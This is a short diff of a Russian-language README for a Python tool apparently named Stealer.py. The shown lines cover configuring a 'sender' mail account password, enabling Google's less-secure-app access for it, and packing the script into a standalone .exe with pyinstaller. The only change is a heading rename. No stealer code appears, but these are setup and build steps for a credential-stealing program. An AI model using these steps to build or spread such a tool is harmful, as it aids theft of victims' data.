@@ -11,7 +11,7 @@ password = "" - пароль от почты "sender"
 ```
 
 Переходим [сюда](https://myaccount.google.com/lesssecureapps), авторизовавшись с почты "sender" и разрешаем доступ
-## Компиляция
+## Запаковка в .ехе
 Чтобы собрать все в .exe файл используем команду:
 ```
 pyinstaller -F --hidden-import=pkg_resources.py2_warn Stealer.py
